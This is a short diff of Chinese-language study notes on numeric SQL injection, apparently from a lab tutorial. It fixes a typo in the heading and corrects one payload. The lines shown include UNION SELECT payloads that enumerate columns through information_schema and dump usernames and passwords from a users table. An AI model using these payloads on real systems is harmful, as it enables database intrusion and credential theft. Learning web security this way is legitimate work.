@@ -1,4 +1,4 @@
-# 数字型注入(不许要单引号闭合)
+# 数字型注入(不需要单引号闭合)
 
 # 1、测试注入点
 ## `?id=1'` :页面报错,说明单引号会破坏结构
@@ -16,7 +16,7 @@
 ## `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`(页面回显id,username,password)
 ## 'users'是字符串要保留单引号
 # 7、爆账号密码
-## `?id=-a union select 1,group_concat(username,0x3a,password),3 from users --+`
+## `?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+`
 
 
 
